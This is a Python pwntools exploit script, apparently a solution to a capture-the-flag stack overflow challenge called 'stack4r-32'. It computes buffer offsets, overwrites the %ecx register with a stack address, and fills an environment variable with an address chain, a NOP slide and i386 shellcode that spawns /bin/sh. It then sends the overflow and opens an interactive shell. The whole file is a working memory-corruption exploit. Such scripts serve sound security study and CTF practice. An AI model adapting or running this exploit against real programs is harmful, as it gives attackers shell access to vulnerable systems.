# stack4-32ex.py - Aidan Wech (Onyxymous)
# /problems/stack4r-32_3_2c7e74d57fc9c662ccad31d5572e0cf4/
from pwn import *
import struct

# debug binary
bin32 = '/problems/stack4r-32_3_2c7e74d57fc9c662ccad31d5572e0cf4/stack4'
elf = ELF(bin32)
context.binary = elf
context.log_level = 'debug'

# exploit string variables
stackbottom = 0xffffe000					# address of the bottom of the stack where environment vars are located
offset1 = 68							# first offset where next 4 bytes in the buffer overflow into %ecx register
offset2 = 80							# second offset that is the size of buffer
ecx = stackbottom - 4000					# address put into %ecx that points to address stored in the nopaddrchain
nopaddrchain = struct.pack("I", stackbottom - 2000) * 750	# chain of addresses that point to the middle of the nop slide
nop = asm(shellcraft.i386.nop()) * 3000				# nop slide
payload = asm(shellcraft.i386.sh())				# shellcode

exploit = flat({
offset1: ecx,
offset2: 0xff000000})

p = process(bin32, env = {'FOO': nopaddrchain + nop + payload})
p.sendline(exploit)
p.interactive()
